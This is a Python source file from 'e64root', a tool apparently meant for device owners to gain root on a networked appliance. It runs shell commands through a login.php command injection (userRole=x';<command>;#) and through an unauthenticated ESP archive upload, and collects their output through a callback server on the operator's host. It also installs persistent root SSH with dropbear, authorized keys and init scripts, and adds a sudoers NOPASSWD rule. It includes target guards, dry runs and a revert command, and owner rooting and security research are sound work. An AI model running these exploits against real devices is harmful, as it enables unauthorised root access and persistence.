"""Command implementations for :mod:`e64root`.

The functions here are deliberately separated from argparse so they can be
driven by the offline tests with fake HTTP/SSH transports.
"""

from __future__ import annotations

import base64
import json
import re
import secrets
import shlex
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable

from . import __version__
from .errors import (
    E64RootError,
    PreconditionError,
    TransportError,
    UsageError,
    VerificationError,
)
from .callback import CallbackServer, detect_callback_host
from .httpclient import (
    HTTPClient,
    TLSConfig,
    TLSProbe,
    probe_banner,
    probe_tls,
    probe_websocket,
)
from .payloads import (
    DEFAULT_INIT_DROPBEAR,
    DEFAULT_INIT_SSHD,
    INIT_MARKER,
    esp_script,
    esp_zip,
    inspect_zip,
    install_init_script,
    install_script,
    inventory_script,
    preflight_script,
    printable_script,
    revert_script,
    sha256_bytes,
    verify_script,
    web_script,
    zip_top_level,
)
from .target import (
    Endpoint,
    Fingerprint,
    guard_target,
    key_fingerprint,
    parse_endpoint,
    parse_login_page,
    plan_daemon,
    require_known_target,
    validate_public_keys,
)
from .transports import (
    EspTransport,
    SSHTransport,
    WebTransport,
    parse_kv,
    parse_callback_uid,
    validate_esp_preconditions,
)

PERSISTENCE = (
    ("/root/.ssh/authorized_keys", "rootfs (A/B slot)", "survives reboot", "lost on the next signed update"),
    ("/usr/sbin/dropbear", "rootfs (A/B slot)", "survives reboot", "lost on the next signed update"),
    ("/etc/init.d/S85dropbear", "rootfs (A/B slot)", "survives reboot", "lost on the next signed update"),
    ("/etc/init.d/S85sshd", "rootfs (A/B slot)", "survives reboot", "lost on the next signed update"),
    ("/root/.e64root/manifest", "rootfs (A/B slot)", "survives reboot", "lost on the next signed update"),
    ("/root/e64root_result", "rootfs (A/B slot)", "survives reboot", "lost on the next signed update"),
)


@dataclass
class ProbeResult:
    guard: str
    fingerprint: Fingerprint | None
    https: TLSProbe
    http_status: int | None
    http_location: str
    wss: dict[str, object]
    ssh: dict[str, object]
    esp: dict[str, object]
    remote: dict[str, str]
    errors: list[str]

    def as_dict(self) -> dict[str, object]:
        return {
            "tool": "e64root",
            "version": __version__,
            "guard": self.guard,
            "fingerprint": self.fingerprint.as_dict() if self.fingerprint else None,
            "https": self.https.as_dict(),
            "http": {"status": self.http_status, "location": self.http_location},
            "wss": self.wss,
            "ssh": self.ssh,
            "esp": self.esp,
            "remote": self.remote,
            "errors": self.errors,
        }


def _print_json(value: object) -> None:
    print(json.dumps(value, indent=2, sort_keys=True))


def _hr(title: str) -> None:
    print(f"\n== {title} ==")


def _make_client(args: Any, endpoint: Endpoint | None = None) -> HTTPClient:
    endpoint = endpoint or parse_endpoint(args.host, args.port)
    if args.scheme == "http" and not getattr(args, "allow_http", False):
        raise UsageError(
            "--scheme http sends the login injection in clear text; "
            "pass --allow-http only on an isolated lab network"
        )
    tls = TLSConfig(insecure=args.insecure, ca_file=args.ca_file)
    return HTTPClient(
        endpoint,
        scheme=args.scheme,
        tls=tls,
        timeout=args.timeout,
    )


def _make_ssh(args: Any, host: str | None = None) -> SSHTransport:
    if not args.ssh_key:
        raise UsageError("--ssh-key is required for this command")
    ssh_host = host or args.ssh_host or parse_endpoint(args.host, args.port).host
    guard_target(ssh_host, args.allow_public)
    return SSHTransport(
        ssh_host,
        port=args.ssh_port,
        key=args.ssh_key,
        timeout=args.timeout,
        strict_host_key=args.strict_host_key,
    )


def _preflight(args: Any, client: HTTPClient) -> Fingerprint:
    guard_target(client.endpoint.host, args.allow_public)
    response = client.get("/login.php")
    if response.status != 200:
        raise PreconditionError(
            f"GET /login.php returned HTTP {response.status}; not a vendor web UI"
        )
    fingerprint = parse_login_page(response.text, client.url("/login.php"), response.status)
    require_known_target(fingerprint, args.allow_unverified_target)
    return fingerprint


def _make_callback(args: Any, endpoint: Endpoint) -> CallbackServer:
    host = args.callback_host or detect_callback_host(endpoint.host, endpoint.port)
    server = CallbackServer(
        host,
        port=args.callback_port,
        timeout=args.callback_timeout,
    )
    return server.start()


def _require_change(args: Any, what: str) -> None:
    if getattr(args, "dry_run", False):
        return
    if not getattr(args, "yes", False):
        raise UsageError(
            f"{what} changes the device. Re-run with --yes after reviewing the "
            "printed script, or use --dry-run to see it without contacting the device."
        )


def _read_pubkeys(path: str | None) -> list[str]:
    if not path:
        return []
    try:
        text = Path(path).expanduser().read_text(encoding="utf-8")
    except OSError as exc:
        raise UsageError(f"cannot read --pubkey-file: {exc}") from exc
    return validate_public_keys(text)


def _print_plan(
    title: str,
    script: str,
    *,
    payload: bytes | None = None,
    binary: bytes | None = None,
) -> None:
    _hr(title)
    print(printable_script(script), end="")
    if payload is not None:
        print(f"\narchive sha256: {sha256_bytes(payload)}")
        print(f"archive bytes:  {len(payload)}")
        for member in inspect_zip(payload):
            mode = "0755" if member.executable else "0644"
            print(f"  {member.name:32s} {member.size:9d} bytes  mode {mode}")
        top = zip_top_level(payload)
        if top != ["payload"]:
            raise VerificationError(f"archive top-level entries are {top!r}, expected ['payload']")
    if binary is not None:
        print(f"binary sha256:  {sha256_bytes(binary)}")
        print(f"binary bytes:   {len(binary)}")


# --- probe ------------------------------------------------------------------

def cmd_probe(args: Any) -> int:
    endpoint = parse_endpoint(args.host, args.port)
    guard = guard_target(endpoint.host, args.allow_public)
    errors: list[str] = []

    https = probe_tls(endpoint.host, endpoint.port, timeout=min(args.timeout, 8.0))
    if not https.open:
        errors.append(f"HTTPS port {endpoint.port}: {https.error}")

    fingerprint: Fingerprint | None = None
    if https.open:
        try:
            client = _make_client(args, endpoint)
            response = client.get("/login.php")
            if response.status == 200:
                fingerprint = parse_login_page(
                    response.text, client.url("/login.php"), response.status
                )
            else:
                errors.append(f"HTTPS /login.php returned HTTP {response.status}")
        except E64RootError as exc:
            errors.append(str(exc))

    http_status: int | None = None
    http_location = ""
    http_endpoint = Endpoint(endpoint.host, args.http_port)
    try:
        http_client = HTTPClient(
            http_endpoint,
            scheme="http",
            tls=TLSConfig(),
            timeout=min(args.timeout, 8.0),
            follow_redirects=False,
        )
        response = http_client.get("/login.php")
        http_status = response.status
        http_location = response.headers.get("location", "")
    except E64RootError as exc:
        errors.append(f"HTTP {args.http_port}: {exc}")

    wss = probe_websocket(endpoint.host, args.wss_port, timeout=min(args.timeout, 8.0)).as_dict()
    banner = probe_banner(endpoint.host, args.ssh_port, timeout=min(args.timeout, 5.0))

    esp: dict[str, object] = {
        "path": "/upload_esp.php",
        "exercised": False,
        "reason": "not requested; a request rewrites /tmp/FirmwareUpdateState.json",
    }
    if args.esp_request and https.open:
        try:
            client = _make_client(args, endpoint)
            response = client.get("/upload_esp.php")
            esp = {
                "path": "/upload_esp.php",
                "exercised": True,
                "status": response.status,
                "state_touched": "/tmp/FirmwareUpdateState.json",
                "body_snippet": response.text.strip()[:200],
            }
        except E64RootError as exc:
            esp = {"path": "/upload_esp.php", "exercised": True, "error": str(exc)}

    remote: dict[str, str] = {}
    ssh_info: dict[str, object] = {
        "port": args.ssh_port,
        "open": banner.open,
        "banner": banner.banner,
        "error": banner.error,
        "authenticated": False,
    }
    if banner.open and args.ssh_key:
        try:
            ssh = _make_ssh(args, endpoint.host)
            ssh.wait_ready(timeout=min(args.ssh_wait, 15.0))
            remote = ssh.read_inventory(verify_script([]))
            ssh_info["authenticated"] = True
        except E64RootError as exc:
            ssh_info["error"] = str(exc)

    result = ProbeResult(
        guard=guard.describe(),
        fingerprint=fingerprint,
        https=https,
        http_status=http_status,
        http_location=http_location,
        wss=wss,
        ssh=ssh_info,
        esp=esp,
        remote=remote,
        errors=errors,
    )
    if args.json:
        _print_json(result.as_dict())
        return 0

    print(f"e64root {__version__} probe (read-only)")
    print(f"target: {guard.describe()}")
    if fingerprint:
        print(f"login page: HTTP {fingerprint.http_status} {fingerprint.url}")
        print(f"  title:     {fingerprint.title or 'unknown'}")
        print(f"  model:     {fingerprint.model or 'unknown'}")
        print(f"  serial:    {fingerprint.serial or 'unknown'}")
        print(f"  firmware:  {fingerprint.firmware or 'unknown'}")
        print(f"  family:    {fingerprint.family}")
        print(f"  dev mode:  {'yes (Developer option / (development) rootfs)' if fingerprint.dev_mode else 'no'}")
        if fingerprint.notes:
            for note in fingerprint.notes:
                print(f"  note:      {note}")
    else:
        print("login page: not fingerprinted")
    print(f"HTTPS :{endpoint.port}: {'open' if https.open else 'closed'}"
          + (f"; cert sha256 {https.certificate_sha256}" if https.open else f" ({https.error})"))
    if https.open:
        print(f"  subject:   {https.subject}")
        print(f"  issuer:    {https.issuer}")
        print(f"  notAfter:  {https.not_after}")
    print(f"HTTP  :{args.http_port}: "
          + (f"{http_status} {http_location}".strip() if http_status else "unreachable"))
    print(f"WSS   :{args.wss_port}: "
          + (str(wss.get("status_line") or wss.get("error") or "unknown")))
    print(f"SSH   :{args.ssh_port}: "
          + (banner.banner if banner.open else f"closed ({banner.error})"))
    print(f"ESP   : /upload_esp.php: "
          + ("exercised (state file touched)" if esp.get("exercised") else "not exercised"))
    if remote:
        print("remote read-only checks (via the owner key):")
        for key in (
            "uid",
            "dropbear_present",
            "dropbear_pid",
            "init_managed",
            "key_block",
            "log_stat",
            "log_www_writable",
            "issue_b64",
        ):
            if key in remote:
                value = remote[key]
                if key == "issue_b64":
                    value = _issue_summary(value)
                print(f"  {key:18s} {value}")
    if errors:
        print("\nerrors:")
        for error in errors:
            print(f"  - {error}")
    return 0


def _decode_issue(value: str) -> str:
    try:
        return base64.b64decode(value).decode("utf-8", errors="replace").strip()
    except Exception:  # noqa: BLE001 - diagnostic only
        return ""


def _issue_summary(encoded: str) -> str:
    issue = _decode_issue(encoded)
    tokens = issue.split()
    dev = bool(tokens) and tokens[0].lower() == "development" and len(tokens) == 14
    return f"{issue[:80]!r} (tokens={len(tokens)}, wss_dev_gate={'open' if dev else 'closed'})"


# --- FW-01 ------------------------------------------------------------------

def cmd_web(
    args: Any,
    client: HTTPClient | None = None,
    web: WebTransport | None = None,
    callback_factory: Callable[[], CallbackServer] | None = None,
) -> int:
    _require_change(args, "FW-01 web command execution")
    command = args.cmd or "id"

    if args.dry_run:
        script = web_script(command, "http://127.0.0.1:1/e64root/dry-run", timeout=args.command_timeout)
        print(f"e64root {__version__} web --dry-run (no device contact)")
        print(f"target: {args.host}")
        _print_plan("FW-01 script that would be sent", script)
        print("\nrequest: POST /login.php")
        print("  login=1&requestDeveloper=1&password=x&userRole=x';<command>;#")
        print("output is returned by a one-shot callback to this host; the dry run does not start it")
        return 0

    client = client or _make_client(args)
    fingerprint = _preflight(args, client)
    print(f"preflight: {fingerprint.model or 'unknown model'}, "
          f"{fingerprint.firmware or 'unknown firmware'}, "
          f"dev={'yes' if fingerprint.dev_mode else 'no'}")
    web = web or WebTransport(client)
    callback = callback_factory() if callback_factory else _make_callback(args, client.endpoint)
    try:
        script = web_script(command, callback.url, timeout=args.command_timeout)
        _print_plan("FW-01 script being sent", script)
        requests = web.run_script(script)
        print(f"\ninjection requests: {requests}")
        body = callback.wait(args.callback_timeout).body
        uid = parse_callback_uid(body)
        print("\nobserved output:")
        print(body.decode("utf-8", errors="replace").rstrip())
        print(f"\nobserved: {uid}")
        if not uid.startswith("uid=0("):
            raise VerificationError(f"injected command did not report uid 0: {uid}")
    finally:
        callback.close()
    return 0


# --- FW-02 ------------------------------------------------------------------

def cmd_esp(
    args: Any,
    client: HTTPClient | None = None,
    web: WebTransport | None = None,
    esp: EspTransport | None = None,
    callback_factory: Callable[[], CallbackServer] | None = None,
) -> int:
    _require_change(args, "FW-02 ESP archive execution")
    command = args.cmd or "id"

    if args.dry_run:
        script = esp_script(command, "http://127.0.0.1:1/e64root/dry-run", timeout=args.command_timeout)
        payload = esp_zip(script)
        if args.zip_out:
            Path(args.zip_out).write_bytes(payload)
            print(f"wrote archive: {args.zip_out}")
        print(f"e64root {__version__} esp --dry-run (no device contact)")
        print(f"target: {args.host}")
        _print_plan("FW-02 do_flash.sh that would be archived", script, payload=payload)
        print("\nESP safety: restore_esp runs first and from an EXIT/INT/TERM/HUP trap.")
        print("The archive never opens /dev/ttySTM5 and never writes ESP flash.")
        print("output is returned by a one-shot callback to this host; the dry run does not start it")
        return 0

    client = client or _make_client(args)
    web = web or WebTransport(client)
    esp = esp or EspTransport(client)
    fingerprint = _preflight(args, client)
    print(f"preflight: {fingerprint.model or 'unknown model'}, "
          f"{fingerprint.firmware or 'unknown firmware'}")

    if args.preflight == "web":
        preflight_callback = (
            callback_factory() if callback_factory else _make_callback(args, client.endpoint)
        )
        try:
            output = web.run_capture(preflight_script(), preflight_callback, timeout=args.callback_timeout)
        finally:
            preflight_callback.close()
        checks = parse_kv(output)
        print("FW-02 preconditions (read-only, via FW-01):")
        for key, value in checks.items():
            print(f"  {key:20s} {value}")
        validate_esp_preconditions(checks)
    elif args.preflight == "ssh":
        ssh = _make_ssh(args)
        ssh.wait_ready(timeout=args.ssh_wait)
        checks = ssh.read_inventory(preflight_script())
        print("FW-02 preconditions (read-only, via SSH):")
        for key, value in checks.items():
            print(f"  {key:20s} {value}")
        validate_esp_preconditions(checks)
    else:
        print("warning: FW-02 precondition check skipped by explicit --preflight skip")

    callback = callback_factory() if callback_factory else _make_callback(args, client.endpoint)
    try:
        script = esp_script(command, callback.url, timeout=args.command_timeout)
        payload = esp_zip(script)
        if args.zip_out:
            Path(args.zip_out).write_bytes(payload)
            print(f"wrote archive: {args.zip_out}")
        _print_plan("FW-02 do_flash.sh being archived", script, payload=payload)
        print("\nuploading to /upload_esp.php (no authentication)")
        reply = esp.upload(payload)
        print(f"upload response: {reply.strip()[:300]}")
        print("ESP payload started; waiting for the callback")
        body = callback.wait(args.callback_timeout).body
        uid = parse_callback_uid(body)
        print("\nobserved output:")
        print(body.decode("utf-8", errors="replace").rstrip())
        print(f"\nobserved: {uid}")
        if not uid.startswith("uid=0("):
            raise VerificationError(f"ESP payload did not report uid 0: {uid}")
    finally:
        callback.close()
    return 0


# --- SSH install ------------------------------------------------------------

def _upload_binary(web: WebTransport, binary: bytes) -> None:
    encoded = base64.b64encode(binary).decode()
    remote_b64 = "/tmp/e64root-dropbear.b64"
    remote = "/tmp/e64root-dropbear"
    web.inject(f"sudo rm -f {remote_b64} {remote}")
    chunk = 40000
    for offset in range(0, len(encoded), chunk):
        part = encoded[offset : offset + chunk]
        web.inject(f"printf '%s' '{part}' >> {remote_b64}")
    web.inject(f"base64 -d {remote_b64} > {remote} && chmod 600 {remote} && rm -f {remote_b64}")


def cmd_ssh(
    args: Any,
    client: HTTPClient | None = None,
    web: WebTransport | None = None,
    esp: EspTransport | None = None,
    ssh: SSHTransport | None = None,
) -> int:
    _require_change(args, "SSH installation")
    if args.dropbear and args.existing_daemon:
        raise UsageError("choose either --dropbear or --existing-daemon, not both")
    pubkeys = _read_pubkeys(args.pubkey_file)
    if not pubkeys:
        raise UsageError("--pubkey-file is required for ssh")
    if not args.ssh_key and not args.dry_run:
        raise UsageError(
            "--ssh-key is required so the tool can prove the newly installed key "
            "logs in as root; pass the private key matching --pubkey-file"
        )
    binary = None
    if args.dropbear:
        try:
            binary = Path(args.dropbear).expanduser().read_bytes()
        except OSError as exc:
            raise UsageError(f"cannot read --dropbear: {exc}") from exc
        if len(binary) > 8 * 1024 * 1024:
            raise UsageError("--dropbear is larger than 8 MiB; refusing to stream it")
        if not binary.startswith(b"\x7fELF"):
            print("warning: --dropbear does not start with an ELF magic", file=sys.stderr)
    plan = plan_daemon(binary, args.existing_daemon)

    init = install_init_script(plan, args.daemon_port)
    script = install_script(pubkeys, plan, port=args.daemon_port)
    init_path = DEFAULT_INIT_DROPBEAR if plan.kind == "dropbear" else DEFAULT_INIT_SSHD

    if args.dry_run:
        print(f"e64root {__version__} ssh --dry-run (no device contact)")
        print(f"target: {args.host} via {args.via.upper()}")
        print(f"daemon: {plan.kind} at {plan.remote_path} ({plan.source})")
        print(f"listen: guest port {args.daemon_port}; connect to {args.ssh_host or args.host}:{args.ssh_port}")
        print(f"keys:   {', '.join(key_fingerprint(key) for key in pubkeys)}")
        print(f"init:   {init_path}")
        _print_plan("SSH installer script that would be sent", script, binary=binary)
        _print_plan("init script", init)
        return 0

    # Guard the SSH endpoint before any change, not just when connecting after
    # the install.  A public --ssh-host without --allow-public must not leave a
    # daemon installed and then refuse to verify it.
    ssh_target_host = args.ssh_host or parse_endpoint(args.host, args.port).host
    guard_target(ssh_target_host, args.allow_public)

    client = client or _make_client(args)
    fingerprint = _preflight(args, client)
    print(f"preflight: {fingerprint.model or 'unknown model'}, "
          f"{fingerprint.firmware or 'unknown firmware'}")
    print(f"daemon: {plan.kind} at {plan.remote_path} ({plan.source})")
    print(f"keys: {', '.join(key_fingerprint(key) for key in pubkeys)}")
    print(f"init: {init_path}; listen port {args.daemon_port}")
    _print_plan("SSH installer script being sent", script, binary=binary)

    if args.via == "web":
        web = web or WebTransport(client)
        if binary is not None:
            print(f"streaming {len(binary)} bytes in bounded FW-01 chunks")
            _upload_binary(web, binary)
        web.run_script(script)
    else:
        esp = esp or EspTransport(client)
        esp_payload = esp_zip(script, binary)
        _print_plan("FW-02 archive", script, payload=esp_payload)
        print("warning: FW-02 pulses the ESP boot/reset pins; power-cycle recovers if interrupted")
        reply = esp.upload(esp_payload)
        print(f"upload response: {reply.strip()[:300]}")

    ssh = ssh or _make_ssh(args)
    print(f"waiting for SSH on {ssh.host}:{ssh.port}")
    ssh.wait_ready(timeout=args.ssh_wait)
    result = ssh.run("id; echo '---'; cat /root/e64root_result 2>/dev/null || true")
    print("\nobserved over SSH:")
    print(result.stdout.rstrip())
    uid = next((line for line in result.stdout.splitlines() if line.startswith("uid=")), "")
    if not uid.startswith("uid=0("):
        raise VerificationError(f"SSH did not return uid 0: {uid or 'no id line'}")
    print(f"\nobserved: {uid}")
    print("\npersistence (see docs/ROOT_TOOL.md):")
    _print_persistence()
    return 0


def _print_persistence() -> None:
    for path, location, reboot, update in PERSISTENCE:
        print(f"  {path:34s} {location:18s} {reboot:16s} {update}")


# --- verify -----------------------------------------------------------------

def cmd_verify(args: Any, ssh: SSHTransport | None = None) -> int:
    pubkeys = _read_pubkeys(args.pubkey_file)
    if not args.ssh_key:
        raise UsageError("--ssh-key is required: verify proves the owner key still logs in as root")
    ssh = ssh or _make_ssh(args)
    ssh.wait_ready(timeout=args.ssh_wait)
    values = ssh.read_inventory(verify_script(pubkeys))
    uid = values.get("uid", "")
    if uid != "0":
        raise VerificationError(f"expected uid 0, observed {uid or 'unknown'}")
    issue = _decode_issue(values.get("issue_b64", ""))
    tokens = issue.split()
    wss_gate = bool(tokens) and tokens[0].lower() == "development" and len(tokens) == 14

    report = {
        "tool": "e64root",
        "version": __version__,
        "uid": uid,
        "user": values.get("user", ""),
        "kernel": values.get("kernel", ""),
        "ssh": {
            "host": ssh.host,
            "port": ssh.port,
            "key_present": any(values.get(f"key_present_{i}") not in (None, "", "0")
                               for i in range(1, len(pubkeys) + 1)) if pubkeys else None,
        },
        "installed": {
            "dropbear_present": values.get("dropbear_present"),
            "dropbear_sha256": values.get("dropbear_sha256"),
            "dropbear_pid": values.get("dropbear_pid"),
            "sshd_present": values.get("sshd_present"),
            "init_present": values.get("init_present") or values.get("init_sshd_present"),
            "init_managed": values.get("init_managed") or values.get("init_sshd_managed"),
            "manifest_present": values.get("manifest_present"),
            "key_block": values.get("key_block"),
        },
        "device": {
            "issue": issue,
            "issue_tokens": len(tokens),
            "wss_dev_gate": "open" if wss_gate else "closed",
            "log_stat": values.get("log_stat"),
            "log_www_writable": values.get("log_www_writable"),
            "tty_stm5": values.get("tty_stm5"),
            "flash_script": values.get("flash_script"),
            "root_mount": values.get("root_mount"),
            "uptime_seconds": values.get("uptime"),
        },
        "persistence": [
            {"path": path, "location": location, "reboot": reboot, "update": update}
            for path, location, reboot, update in PERSISTENCE
        ],
        "raw": values,
    }
    if args.json:
        _print_json(report)
        return 0

    print(f"e64root {__version__} verify")
    print(f"SSH {ssh.host}:{ssh.port} authenticated with the owner key")
    print(f"observed: uid={uid} user={values.get('user', '?')} kernel={values.get('kernel', '?')}")
    if pubkeys:
        print("owner key present in /root/.ssh/authorized_keys: "
              + ("yes" if any(values.get(f"key_present_{i}") not in (None, "", "0")
                              for i in range(1, len(pubkeys) + 1)) else "NO"))
    _hr("installed artifacts")
    for key in ("dropbear_present", "dropbear_sha256", "dropbear_pid", "sshd_present"):
        print(f"  {key:20s} {values.get(key, '')}")
    init_present = values.get("init_present") or values.get("init_sshd_present")
    init_managed = values.get("init_managed") or values.get("init_sshd_managed")
    print(f"  {'init_present':20s} {init_present}")
    print(f"  {'init_managed':20s} {init_managed}")
    for key in ("manifest_present", "key_block"):
        print(f"  {key:20s} {values.get(key, '')}")
    _hr("device state")
    print(f"  issue:            {issue or 'unknown'}")
    print(f"  issue tokens:     {len(tokens)}; WSS dev gate: {'open' if wss_gate else 'closed'}")
    print(f"  /log:             {values.get('log_stat', 'unknown')} "
          f"(www-data writable: {values.get('log_www_writable', 'unknown')})")
    print(f"  /dev/ttySTM5:     {values.get('tty_stm5', 'unknown')}")
    print(f"  flashEspZip.sh:   {values.get('flash_script', 'unknown')}")
    print(f"  root mount:       {values.get('root_mount', 'unknown')}")
    print(f"  uptime:           {values.get('uptime', 'unknown')} s")
    _hr("persistence")
    _print_persistence()
    return 0


# --- revert -----------------------------------------------------------------

def cmd_revert(args: Any, ssh: SSHTransport | None = None) -> int:
    pubkeys = _read_pubkeys(args.pubkey_file)
    if not args.ssh_key and not args.print_script:
        raise UsageError("--ssh-key is required: revert removes the SSH state it installed")
    script = revert_script(pubkeys, purge_backups=args.purge_backups, keep_daemon=args.keep_daemon)

    if args.print_script:
        print(printable_script(script), end="")
        return 0

    ssh = ssh or _make_ssh(args)
    ssh.wait_ready(timeout=args.ssh_wait)
    values = ssh.read_inventory(inventory_script(pubkeys))
    print(f"e64root {__version__} revert")
    print(f"SSH {ssh.host}:{ssh.port} authenticated; uid={values.get('uid', '?')}")
    _hr("current e64root state")
    for key in (
        "manifest_present",
        "init_present",
        "init_managed",
        "dropbear_present",
        "dropbear_sha256",
        "authorized_keys_sha256",
        "key_block",
        "backup_keys",
        "backup_init",
        "backup_dropbear",
    ):
        print(f"  {key:24s} {values.get(key, '')}")
    _hr("planned changes")
    print("  remove the '# e64root begin' ... '# e64root end' key block (other keys stay)")
    print("  restore /usr/sbin/dropbear from /root/.e64root/backup if present, else remove if its digest matches")
    print(f"  restore {DEFAULT_INIT_DROPBEAR}/{DEFAULT_INIT_SSHD} from backup, else remove if it carries '{INIT_MARKER}'")
    print("  remove /root/e64root_result and /tmp/e64root-*")
    print("  keep /root/.e64root/backup unless --purge-backups is given")
    if not args.keep_daemon:
        print("  stop dropbear after the response leaves (this SSH session will end)")

    if not args.yes:
        print("\ndry run: no changes made. Re-run with --yes to execute.")
        return 0

    _hr("executing revert")
    try:
        result = ssh.run(script)
    except TransportError as exc:
        if args.keep_daemon:
            raise
        print(
            "warning: the SSH transport closed before the final line; the daemon stop "
            "is expected to do that. Re-run verify to confirm.",
            file=sys.stderr,
        )
        return 0
    if result.stdout:
        print(result.stdout.rstrip())
    if result.stderr:
        print(result.stderr.rstrip(), file=sys.stderr)
    if "revert=done" not in result.stdout and result.returncode == 255:
        print(
            "warning: the SSH transport closed before the final line; the daemon stop "
            "is expected to do that. Re-run verify to confirm.",
            file=sys.stderr,
        )
    elif result.returncode != 0:
        raise TransportError(f"revert exited {result.returncode}")
    print("\nrevert finished. Backups remain under /root/.e64root/backup unless --purge-backups was used.")
    return 0


# --- API (local owner HTTP API) ------------------------------------------------------

API_MODULE_PATH = "ondevice/rest_api_dev.php"
API_TOKEN_DIR = "/db/e64local"
API_TOKEN_FILE = "/db/e64local/token"


def _api_module_path() -> str:
    """Return the absolute path to the local API PHP module in the repository."""
    repo_root = Path(__file__).resolve().parents[2]
    module_path = repo_root / "ondevice" / "rest_api_dev.php"
    if module_path.is_file():
        return str(module_path)
    module_path = Path("ondevice/rest_api_dev.php")
    if module_path.is_file():
        return str(module_path.resolve())
    raise UsageError(
        "cannot find ondevice/rest_api_dev.php in the repository. "
        "Run from the repository root or ensure the file exists."
    )


def _check_owner_token(token: str) -> str:
    """Validate an owner token before it is embedded in a deploy script."""
    if not token:
        raise UsageError("owner token must not be empty")
    if len(token) > 4096:
        raise UsageError("owner token is longer than 4096 characters")
    if any(ch in token for ch in "\r\n\x00"):
        raise UsageError("owner token must not contain control characters")
    return token


API_POLICY_FILE = "/db/e64local/actions.json"
API_ACTION_DIR = "/db/e64local/actions"
API_RATE_DIR = "/db/e64local/rate"
API_BACKUP_DIR = "/db/e64local/backup"
API_AUDIT_FILE = "/db/e64local/audit.jsonl"
API_RUNNER = "/usr/local/bin/e64local-action-run"

# The module runs as www-data and starts the root-owned runner through
# `sudo -n`.  Without a sudoers rule that call is refused and every action
# fails with 503, so the rule is part of the action layer, not an extra.
#
# The rule is deliberately the narrowest one that works: one run-as user, one
# binary, no wildcard, no argument pattern, no SETENV, no NOPASSWD: ALL.  The
# runner's own allowlist (WSS command names and fixed SQLite statements) stays
# the real boundary; sudoers only decides who may start that boundary.
API_SUDOERS_FILE = "/etc/sudoers.d/e64local"
API_SUDOERS_MARKER = "# e64local: managed by e64root api deploy --enable-actions; do not edit"
API_SUDOERS_RULE = f"www-data ALL=(root) NOPASSWD: {API_RUNNER}"


def _api_sudoers_content() -> str:
    """Return the exact content of /etc/sudoers.d/e64local.

    A comment line and one rule.  The marker is what `revert` looks for, so a
    hand-written rule at the same path is never deleted by this tool.
    """
    return f"{API_SUDOERS_MARKER}\n{API_SUDOERS_RULE}\n"

# Defaults written into /db/e64local/actions.json.  The PHP module clamps every
# value to its own absolute cap, so a hand-edited policy can narrow a bound but
# can never widen one.
API_ACTION_BOUNDS = {
    "targetWeightGr": {"min": 0.1, "max": 50.0},
    "grindTimeSec": {"min": 0.5, "max": 60.0},
    "manualGrindMs": {"min": 100, "max": 5000},
    "purgeMs": {"min": 100, "max": 10000},
    "agsaStepDd": {"min": 1, "max": 300},
    "fanDuty": {"min": 0, "max": 100},
    "brightness": {"min": 0, "max": 100},
    "brewTimeMs": {"min": 0, "max": 120000},
    "brewWeightMg": {"min": 0, "max": 200000},
    "recipeAmountMg": {"min": 100, "max": 100000},
    "recipeCoarseness": {"min": 0, "max": 10000},
    "standbySec": {"min": 0, "max": 86400},
    "settingsEntries": {"min": 1, "max": 8},
}

API_ACTION_RATE_LIMITS = {
    "grind_start": {"perMinute": 6, "perHour": 30},
    "grind_stop": {"perMinute": 60, "perHour": 600},
    "agsa": {"perMinute": 10, "perHour": 120},
    "fan": {"perMinute": 10, "perHour": 120},
    "display": {"perMinute": 30, "perHour": 300},
    "settings_write": {"perMinute": 30, "perHour": 300},
    "recipe_write": {"perMinute": 30, "perHour": 300},
    "brew": {"perMinute": 30, "perHour": 300},
    "calibration": {"perMinute": 2, "perHour": 2},
    "destructive": {"perMinute": 1, "perHour": 1},
    "execute": {"perMinute": 60, "perHour": 600},
    "default": {"perMinute": 30, "perHour": 300},
}


def _api_runner_path() -> str:
    """Return the absolute path to the bounded action runner in the repository."""
    repo_root = Path(__file__).resolve().parents[2]
    runner_path = repo_root / "ondevice" / "e64local_action_run.php"
    if runner_path.is_file():
        return str(runner_path)
    raise UsageError(
        "cannot find ondevice/e64local_action_run.php in the repository. "
        "Run from the repository root or ensure the file exists."
    )


def _action_policy_document(destructive: bool, secret: str) -> dict:
    """Build the policy file written by `api deploy --enable-actions`."""
    return {
        "schema": "e64local-actions-v1",
        "version": 1,
        "enabled": True,
        "destructiveEnabled": bool(destructive),
        "enabledAt": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "enabledBy": "e64root api deploy --enable-actions",
        "secret": secret,
        "bounds": API_ACTION_BOUNDS,
        "rateLimits": API_ACTION_RATE_LIMITS,
        "tokenTtlSec": {"actuator": 60, "stateChanging": 600, "destructive": 60},
        "audit": {"file": API_AUDIT_FILE, "maxBytes": 1048576, "keep": 3},
    }


def _redact_script_secrets(script: str) -> str:
    """Remove the action HMAC secret from a script that is printed to a user."""
    return re.sub(r'"secret": "[0-9a-f]{64}"', '"secret": "<generated at deploy time>"', script)


# Install half of the sudoers rule.  It runs before the policy file is written,
# so a refusal here leaves the gate closed (403) instead of armed but unusable
# (503).  The temp file name contains a dot, and sudo's includedir ignores such
# names, so even a crash between write and rename cannot activate a partial
# file.
API_SUDOERS_BLOCK = """# --- sudoers rule for the action runner -------------------------------------
# The module runs as www-data and reaches the runner through `sudo -n`.  The
# rule below grants exactly one binary: no wildcard, no argument pattern, no
# SETENV and no `NOPASSWD: ALL`.  The runner's own allowlist stays the boundary.
if ! command -v visudo >/dev/null 2>&1; then
  echo "e64root api deploy: visudo is required to validate __E64_SUDOERS_FILE__; refusing to install an unvalidated sudoers file" >&2
  exit 1
fi
if [ ! -d /etc/sudoers.d ]; then
  echo "e64root api deploy: /etc/sudoers.d does not exist, so the rule would never be read" >&2
  exit 1
fi
sudoers_tmp=
sudoers_cleanup() {
  if [ -n "$sudoers_tmp" ]; then
    rm -f "$sudoers_tmp"
  fi
}
trap sudoers_cleanup EXIT
sudoers_tmp=$(mktemp /etc/sudoers.d/.e64local.XXXXXX) || {
  echo "e64root api deploy: cannot create a temporary file under /etc/sudoers.d" >&2
  exit 1
}
cat > "$sudoers_tmp" << 'E64LOCAL_SUDOERS'
__E64_SUDOERS_CONTENT__E64LOCAL_SUDOERS
chmod 0440 "$sudoers_tmp"
chown root:root "$sudoers_tmp" 2>/dev/null || chown root "$sudoers_tmp" 2>/dev/null || true
if ! visudo -cf "$sudoers_tmp" >/dev/null 2>&1; then
  echo "e64root api deploy: the generated sudoers rule failed visudo validation; nothing was installed" >&2
  exit 1
fi
